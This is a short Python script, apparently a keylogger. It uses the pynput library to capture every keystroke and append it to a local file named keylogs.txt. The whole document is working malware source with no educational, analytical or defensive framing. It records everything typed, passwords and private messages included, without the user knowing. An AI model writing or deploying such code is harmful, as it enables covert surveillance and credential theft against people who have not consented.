import os
from pynput import keyboard

def on_press(key):
    try:
        with open('keylogs.txt', 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write(f'[{str(key)}]')
    except Exception as e:
        print(f"Error occurred: {e}")

def main():
    if not os.path.exists('keylogs.txt'):
        open('keylogs.txt', 'w').close()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()